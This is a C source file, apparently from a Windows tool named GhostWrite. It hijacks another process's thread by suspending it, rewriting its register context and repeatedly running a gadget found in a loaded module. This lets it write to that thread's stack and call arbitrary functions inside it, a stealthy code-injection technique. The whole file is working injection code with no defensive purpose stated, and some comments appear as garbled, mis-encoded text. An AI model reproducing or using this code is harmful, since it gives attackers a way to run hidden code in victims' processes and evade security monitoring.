#include "GhostWrite.h"


BYTE GwCharToHex(PBYTE pCode)
{
	BOOL blHighFlag = TRUE;
	DWORD dwValue = 0;
	BYTE btData = 0;
	do
	{
		DWORD dwOffset = 4;
		if (blHighFlag)
		{
			dwOffset = 0;
		}
		if (pCode[blHighFlag] >= 'a' && pCode[blHighFlag] <= 'f')
		{
			dwValue = 0xa + pCode[blHighFlag] - 'a';
			btData |= dwValue << dwOffset;
		}
		else if (pCode[blHighFlag] >= 'A' && pCode[blHighFlag] <= 'F')
		{
			dwValue = 0xA + pCode[blHighFlag] - 'A';
			btData |= dwValue << dwOffset;
		}
		else if (pCode[blHighFlag] >= '0' && pCode[blHighFlag] <= '9')
		{
			dwValue = pCode[blHighFlag] - '0';
			btData |= dwValue << dwOffset;
		}
	} while (blHighFlag--);

	return btData;
}

DWORD GwSignatureToData(IN PBYTE argSignature, OUT PBYTE argData)
{
	DWORD i = 0;
	DWORD dwIndex = 0;
	//BYTE 
	while (argSignature[i] != '\0')
	{
		if (argSignature[i] == '?' || argSignature[i] == '*')
		{
			argData[dwIndex] = argSignature[i];
			i++;
			dwIndex++;
			continue;
		}
		argData[dwIndex] = GwCharToHex(&argSignature[i]);
		i += 2;
		dwIndex++;
	}
	return dwIndex; //����
}

PVOID GwFindGadgetAddress(IN PBYTE pFuncAddr, IN DWORD dwSearchLen, IN PBYTE argSignature)
{
	PBYTE pArgData = VirtualAlloc(0, CODE_SIZE, MEM_COMMIT, PAGE_READWRITE);
	DWORD dwStrLen = GwSignatureToData(argSignature, pArgData);

	PBYTE pTmp = pFuncAddr;
	DWORD dwIndex = 0;
	DWORD i = 0;
	while (dwSearchLen--)
	{
		
		if (pArgData[dwIndex] == '?' || pArgData[dwIndex] == '*')
		{
			i++;
			dwIndex++;
			continue;
		}

		if (pTmp[i] == pArgData[dwIndex])
		{
			dwIndex++;
		}
		else
		{
			dwIndex = 0;
		}
		

		if (dwIndex == dwStrLen)
		{
			return pTmp + i - dwStrLen + 1;
		}
		i++;
	}
	return 0;
}

PVOID GwGetGadgetInfo(IN PCHAR ModuleName, IN PCHAR FuncName,IN DWORD dwSearchLen, IN PBYTE argSignature)
{
	HMODULE hNtdll = NULL;
	PVOID lpFuncAddress = NULL;
	PVOID lpGadgetAddress = NULL;
	
	do 
	{
		hNtdll = LoadLibraryA(ModuleName);
		if (!hNtdll)
		{
			break;
		}
		lpFuncAddress = (PVOID)GetProcAddress(hNtdll, FuncName);
		if (!lpFuncAddress)
		{
			printf("[-]: Get Function Address Failure !\r\n");
			FreeLibrary(hNtdll);
			break;
		}

		lpGadgetAddress = GwFindGadgetAddress(lpFuncAddress, dwSearchLen, argSignature);
		
	} while (0);

	return lpGadgetAddress;
}

BOOL GwSuspendThreadByHandle(IN LPHANDLE lpThreadHandle, OUT LPCONTEXT lpContext)
{
	do
	{
		if (!(*lpThreadHandle))
		{
			break;
		}

		DWORD dwStatus = SuspendThread(*lpThreadHandle);
		if (dwStatus == -1)
		{
			printf("[-]: Thread Suspend Failure !\r\n");
			break;
		}

		dwStatus = GetThreadContext(*lpThreadHandle, lpContext);
		if (!dwStatus)
		{
			printf("[-]: Get Thread Context Failure !\r\n");
			break;
		}
	} while (0);
	return 1;
}

BOOL GwSuspendThread(IN DWORD dwThreadId, OUT LPHANDLE lpThreadHandle, OUT LPCONTEXT lpContext)
{
	do 
	{
		*lpThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
		if (!(*lpThreadHandle))
		{
			printf("[-]: Open Thread Failure !\r\n");
			break;
		}

		DWORD dwStatus = SuspendThread(*lpThreadHandle);
		if (dwStatus == -1)
		{
			printf("[-]: Thread Suspend Failure !\r\n");
			break;
		}

		dwStatus = GetThreadContext(*lpThreadHandle, lpContext);
		if (!dwStatus)
		{
			printf("[-]: Get Thread Context Failure !\r\n");
			break;
		}
	} while (0);
	return 1;
}

BOOL GwResumeThread(IN LPHANDLE lpThreadHandle, IN LPCONTEXT lpContext)
{
	if (*lpThreadHandle == NULL)
	{
		return -1;
	}
	SetThreadContext(*lpThreadHandle, lpContext);
	ResumeThread(*lpThreadHandle);

	return 0;
}

VOID GwExecuteGadget(IN LPHANDLE lpThreadHandle, IN LPCONTEXT lpContext, IN DWORD64 qwJmpSelf, IN BOOL isHaveRetValue, OUT PDWORD64 pRetValue)
{
	CONTEXT ctCurrentContext = { 0 };
	ctCurrentContext.ContextFlags = CONTEXT_FULL;

	GwResumeThread(lpThreadHandle, lpContext);

	while (1)
	{
		Sleep(30);
		GwSuspendThreadByHandle(lpThreadHandle, &ctCurrentContext);
		if (ctCurrentContext.Rip == (DWORD64)qwJmpSelf)
		{
			break;
		}
		ResumeThread(*lpThreadHandle);
	}

	if (isHaveRetValue)
	{
		*pRetValue = ctCurrentContext.Rax;
	}
}

DWORD64 GwWriteReturnAddress(IN LPHANDLE lpThreadHandle, IN PGGIF pGadgetInfo, IN DWORD dwFuncArgc, IN PDWORD64 pArg, IN DWORD64 pCallFuncAddress)
{
	CONTEXT ctTmp = { 0 };
	ctTmp.ContextFlags = CONTEXT_FULL;
	GetThreadContext(*lpThreadHandle, &ctTmp);
	
	ctTmp.Rsp -= (DWORD64)pGadgetInfo->dwPreStackSize + (DWORD64)pGadgetInfo->dwExtStackSize;
	ctTmp.Rip = pGadgetInfo->qwGadgetAddress;
	((PDWORD64)&ctTmp)[pGadgetInfo->SrcRegister] = pGadgetInfo->qwAutoLockAddress;
	((PDWORD64)&ctTmp)[pGadgetInfo->DstRegister] = ctTmp.Rsp + pGadgetInfo->dwPreStackSize - pGadgetInfo->RegisterOffset;
	
	GwExecuteGadget(lpThreadHandle, &ctTmp, pGadgetInfo->qwAutoLockAddress, FALSE, 0);
	
	if (dwFuncArgc != 0)
	{
		//����������ַ
		((PDWORD64)&ctTmp)[pGadgetInfo->SrcRegister] = pCallFuncAddress;
		((PDWORD64)&ctTmp)[pGadgetInfo->DstRegister] = ((ctTmp.Rsp + pGadgetInfo->dwPreStackSize - pGadgetInfo->RegisterOffset) - 8);
		GwExecuteGadget(lpThreadHandle, &ctTmp, pGadgetInfo->qwAutoLockAddress, FALSE, 0);

		//push����
		//������������
		for (DWORD i = 1; i <= (dwFuncArgc - 4); i++)
		{
			((PDWORD64)&ctTmp)[pGadgetInfo->SrcRegister] = *(pArg + dwFuncArgc - i);
			((PDWORD64)&ctTmp)[pGadgetInfo->DstRegister] = ((ctTmp.Rsp + pGadgetInfo->dwPreStackSize - pGadgetInfo->RegisterOffset) - ((i + 1) << 3));

			GwExecuteGadget(lpThreadHandle, &ctTmp, pGadgetInfo->qwAutoLockAddress, FALSE, 0);
		}

		//�Ĵ�������
		//�������üĴ���
		ctTmp.R9 = *(pArg + 3);
		ctTmp.R8 = *(pArg + 2);
		ctTmp.Rdx = *(pArg + 1);
		ctTmp.Rcx = *(pArg + 0);

		//ִ�к���,��ȡ����ֵ
		DWORD64 qwRetValue = 0;
		ctTmp.Rsp -= 0x8;
		((PDWORD64)&ctTmp)[pGadgetInfo->DstRegister] = (ctTmp.Rsp + pGadgetInfo->dwPreStackSize - pGadgetInfo->RegisterOffset);
		GwExecuteGadget(lpThreadHandle, &ctTmp, pGadgetInfo->qwAutoLockAddress, TRUE, &qwRetValue);

		return qwRetValue;
	}
	
	return 0;
}